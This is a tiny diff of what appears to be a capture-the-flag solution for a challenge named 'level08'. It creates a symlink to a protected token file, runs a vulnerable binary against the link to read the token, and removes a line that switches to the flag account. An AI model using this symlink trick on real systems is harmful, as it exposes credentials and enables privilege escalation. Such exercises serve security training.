@@ -1,3 +1,2 @@
-ln -s /home/user/level08/token /tmp/w
-./level08 /tmp/w
-su flag08
+ln -s /home/user/level08/token /tmp/x
+./level08 /tmp/x
